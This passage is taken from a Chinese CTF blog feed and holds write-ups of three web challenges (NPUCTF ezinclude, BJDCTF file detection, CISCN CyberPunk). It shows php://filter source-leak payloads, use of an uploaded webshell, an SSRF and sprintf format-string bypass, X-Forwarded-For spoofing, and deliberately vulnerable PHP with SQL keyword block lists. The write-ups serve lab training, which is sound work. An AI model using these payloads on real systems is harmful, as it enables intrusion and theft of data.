print(1)</span><br></pre></td></tr></table></figure><p>这里怎么找到我们刚才上传的马呢？这里可以应该爆破，但是师傅们好像扫描到了更方便的东西。访问<code>dir.php</code>可以echo出我们上传的文件的信息<br><img src="/2020/11/06/NPUCTF2020-ezinclude//6.png"></p><h2 id="00e-读取flag"><a href="#00e-读取flag" class="headerlink" title="00e.读取flag"></a>00e.读取flag</h2><p>这里直接包含下木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/convert.base64-encode/resource=/tmp/phpZNhB5P</span><br></pre></td></tr></table></figure><p><img src="/2020/11/06/NPUCTF2020-ezinclude//7.png"></p><p>然后用下面的payload包含木马，并通过hackbar传参<code>sword=phpinfo();</code>,(flag在phpinfo里面。。。)读取flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=/tmp/phpZNhB5P</span><br><span class="line"></span><br><span class="line">#POST</span><br><span class="line">sword=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/11/06/NPUCTF2020-ezinclude//8.png"></p><p>capture the flag<br><img src="/2020/11/06/NPUCTF2020-ezinclude//9.png"></p><p>flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5e20b2b8-24ac-4940-90e3-f5994ab5b787&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-2nd-文件探测</title>
      <link href="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/"/>
      <url>/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我喜欢桂花的香味，但我又讨厌它飘得太远。<br><strong>我看她还行，请认识她的人通知一下她可以追我，希望她不要不识好歹。<code>[歪嘴]</code></strong><br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//bingbing.jpg" alt="bingbing"></p></blockquote><blockquote><p>网易云</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=556532480&auto=1&height=66"></iframe><h2 id="1-hint-home-php"><a href="#1-hint-home-php" class="headerlink" title="1.hint:home.php"></a>1.hint:home.php</h2><p><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//1.png"><br>注意看响应包里面的提示<code>home.php</code>，访问一下得下面的界面<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//2.png"></p><p><strong>简单地测试一下</strong></p><p>分为三次输入<code>system.php</code>、<code>8</code>、<code>POST</code><br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//3.png"><br>结果返回的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python fuck.py -u &quot;8.y1ng.txt&quot; -M POST -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei</span><br><span class="line">       Error:  url invalid</span><br></pre></td></tr></table></figure><p>由此可见服务端执行的命令为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fuck.py -u &quot;8.y1ng.txt&quot; -M POST -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei</span><br></pre></td></tr></table></figure><h2 id="2-php-x2F-x2F-filter伪协议读取源码"><a href="#2-php-x2F-x2F-filter伪协议读取源码" class="headerlink" title="2.php:&#x2F;&#x2F;filter伪协议读取源码"></a>2.php:&#x2F;&#x2F;filter伪协议读取源码</h2><p>使用如下的payload可得到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home.php?file=php://filter/convert.base64-encode/resource=home</span><br></pre></td></tr></table></figure><p>最后用<code>home</code>(而不是<code>home.php</code>)是因为我们刚才第一步的判断，即他会自动将我们提交的url末尾添加<code>.php</code>后缀。</p><p>读取得到源码<code>index.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">setcookie(&quot;y1ng&quot;, sha1(md5(&#x27;y1ng&#x27;)), time() + 3600);</span><br><span class="line">setcookie(&#x27;your_ip_address&#x27;, md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]), time()+3600);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    if (preg_match(&quot;/\^|\~|&amp;|\|/&quot;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">        die(&quot;forbidden&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">        die(&quot;not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">        die(&quot;You! are! not! my! admin!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/^home$/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">        die(&quot;禁止套娃&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">            $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;现在访问的是 &quot;.$file . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        require $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>system.php</code>文件内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 = &#x27;/^http:\/\/127\.0\.0\.1\//i&#x27;;    #匹配http://127.0.0.1/</span><br><span class="line">$filter2 = &#x27;/.?f.?l.?a.?g.?/i&#x27;;              #匹配flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;q1&#x27;]) &amp;&amp; isset($_POST[&#x27;q2&#x27;]) &amp;&amp; isset($_POST[&#x27;q3&#x27;]) ) &#123;</span><br><span class="line">    $url = $_POST[&#x27;q2&#x27;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method = $_POST[&#x27;q3&#x27;];</span><br><span class="line"></span><br><span class="line">    $str1 = &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#x27;/^GET/i&#x27;, $method) &amp;&amp; !preg_match(&#x27;/^POST/i&#x27;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="3-代码审计读admin-php"><a href="#3-代码审计读admin-php" class="headerlink" title="3.代码审计读admin.php"></a>3.代码审计读<code>admin.php</code></h2><p>这里主要利用的是<code>system.php</code>文件来读取我们的<code>admin.php</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#怎么输出问们想要读取的文件</span><br><span class="line">主要就是system.php文件的最后一句代码，`print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.q1没限制，传什么都ok</span><br><span class="line">2.q2可注释掉后面的内容，并且要求以`http://127.0.0.1`开头也就是传`http://127.0.0.1/admin.php#`</span><br><span class="line">3.q3需要绕过`!preg_match(&#x27;/^GET/i&#x27;, $method) &amp;&amp; !preg_match(&#x27;/^POST/i&#x27;, $method)`，</span><br><span class="line">而且还得实现`print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));`</span><br><span class="line">所以q3可用`sprintf格式化字符串漏洞`来绕过，使用%绕过，即q3=POST%s% -&gt; POST%s%%d,%%会将%吞掉，d就成字符串了(换言之就没用了)</span><br><span class="line">print(sprintf(&quot;$url method&amp;content_size:POST%S%%d&quot;, $detect));</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/php/func_string_sprintf.asp">SPRINTF函数的介绍</a></p><p>以以下的payload访问得<code>admin.php</code>的源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">q1=1</span><br><span class="line">q2=http://127.0.0.1/admin.php#</span><br><span class="line">q3=POST%s%</span><br></pre></td></tr></table></figure><p>三个值依次在<code>system.php</code>页面的那个框里面输入，记得输入的时候去掉<code>q1=</code>之类的前缀嗷。<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//4.png"><br><code>admin.php</code>的源代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = &#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;; //fake</span><br><span class="line"></span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method = &#x27;AES-128-CBC&#x27;;</span><br><span class="line">    $iv = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($_COOKIE[&#x27;your_ip_address&#x27;]) &amp;&amp; $_COOKIE[&#x27;your_ip_address&#x27;] === md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_COOKIE[&#x27;y1ng&#x27;] === sha1(md5(&#x27;y1ng&#x27;)))</span><br><span class="line">        return true;</span><br><span class="line">    else</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_SERVER[&#x27;REMOTE_ADDR&#x27;] == &quot;127.0.0.1&quot; ) &#123;    #要以本地访问</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[&#x27;user&#x27;] = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;decrypt&#x27;])) &#123;</span><br><span class="line">    $decr = $_GET[&#x27;decrypt&#x27;];</span><br><span class="line">    if (Check())&#123;      #还得绕过check()方法。。。</span><br><span class="line">        $data = $_SESSION[&#x27;secret&#x27;];</span><br><span class="line">        include &#x27;flag_2sln2ndln2klnlksnf.php&#x27;;</span><br><span class="line">        $cipher = aesEn($data, &#x27;y1ng&#x27;);     </span><br><span class="line">        if ($decr === $cipher)&#123;       #给出的密钥要等于你上传的密钥参数</span><br><span class="line">            echo WHAT_YOU_WANT;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#x27;爬&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        header(&quot;Refresh:0.1;url=index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    //I heard you can break PHP mt_rand seed</span><br><span class="line">    mt_srand(rand(0,9999999));</span><br><span class="line">    $length = mt_rand(40,80);</span><br><span class="line">    $_SESSION[&#x27;secret&#x27;] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>需要绕过的点为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.X-Forwarded-For: 127.0.0.1</span><br><span class="line">2.传入加密内容</span><br></pre></td></tr></table></figure><p>第一个好实现，下面是第二个的实现方法。<br><strong>加密算法为</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method = &#x27;AES-128-CBC&#x27;;</span><br><span class="line">    $iv = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//5.png">这里是你的ip。</p><p>构造payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method = &#x27;AES-128-CBC&#x27;;</span><br><span class="line">    $iv = md5(&quot;172.16.157.96&quot;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cipher = aesEn(&#x27;&#x27;,&#x27;y1ng&#x27;);     /**这里的$data置为空就能绕过随机数session[&#x27;secret&#x27;]了*/</span><br><span class="line">echo urlencode($cipher);</span><br><span class="line">//FP6ZnZ%2F3L96GrtQEepvM1w%3D%3D</span><br></pre></td></tr></table></figure><p>执行脚本得payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?decr=FP6ZnZ%2F3L96GrtQEepvM1w%3D%3D</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="4-capture-the-flag"><a href="#4-capture-the-flag" class="headerlink" title="4.capture the flag"></a>4.capture the flag</h2><p>先删除下phpsessid。<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//7.png"></p><p>burp里面顺便修改一下xff。<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//6.png"></p><p>如下获得flag。<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B//8.png"></p><h2 id="5-flag"><a href="#5-flag" class="headerlink" title="5.flag"></a>5.flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fe12fd91-0f6c-4f53-b65c-6fbcd3eac770&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
            <tag> php之sprintf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019-华北赛区-Day1-Web5-CyberPunk</title>
      <link href="/2020/11/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/"/>
      <url>/2020/11/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/</url>
      
        <content type="html"><![CDATA[<blockquote><p>晚来天欲雪，能饮一杯无。</p></blockquote><h2 id="1-读取源码"><a href="#1-读取源码" class="headerlink" title="1.读取源码"></a>1.读取源码</h2><p>有提示，下次提示能不能明显一点请问。。。<br><img src="/2020/11/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk//1.png"><br>访问<code>?file=</code><br>用<code>php伪协议</code>读取一下源码，payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>这个读取index.php的内容，下面是效果<br><img src="/2020/11/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk//2.png"><br>拿到后解码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment">//index.php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>除了<code>index.php</code>之外，还有下面的文件同样可以使用相同的方法来读取<code>confirm.php</code>，<code>delete.php</code>，<code>change.php</code>，<code>search.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment">//confirm.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$user_name</span>.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$user_name</span>, <span class="variable">$address</span>, <span class="variable">$phone</span>);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//delete.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span 